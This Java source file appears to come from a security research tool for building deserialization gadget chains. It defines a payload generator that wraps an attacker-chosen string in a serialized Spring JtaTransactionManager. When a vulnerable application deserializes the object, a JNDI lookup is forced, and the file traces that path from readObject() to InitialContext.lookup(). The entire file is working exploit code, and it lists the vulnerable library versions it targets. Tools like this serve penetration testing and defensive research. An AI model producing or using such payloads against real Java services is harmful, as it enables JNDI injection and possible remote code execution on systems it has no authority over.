package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.springframework.transaction.jta.JtaTransactionManager;

@Dependencies( {
        "org.springframework:spring-tx:5.1.7.RELEASE",
        "org.springframework:spring-context:5.1.7.RELEASE",
        "javax.transaction:jta:1.1",
        "org.springframework:spring-beans:5.1.7.RELEASE",
        "org.springframework:spring-core:5.1.7.RELEASE",
        "commons-logging:commons-logging:1.2"
} )
@Authors({ Authors.ZEROTHOUGHTS, Authors.SCICCONE })
@Impact(Impact.JNDI)
public class SpringJta extends GadgetChain<NoTrampoline> {

    public SpringJta() {
        super(NoTrampoline.getInstance());
    }

    public SpringJta(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        JtaTransactionManager jta = new JtaTransactionManager();
        jta.setUserTransactionName(command);

        return new TrampolineConnector(jta);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.springframework.transaction.jta.JtaTransactionManager.readObject()\n" +
                "org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager()\n" +
                "org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction()\n" +
                "org.springframework.jndi.JndiTemplate.lookup()\n" +
                "javax.naming.InitialContext.lookup()";
    }

}
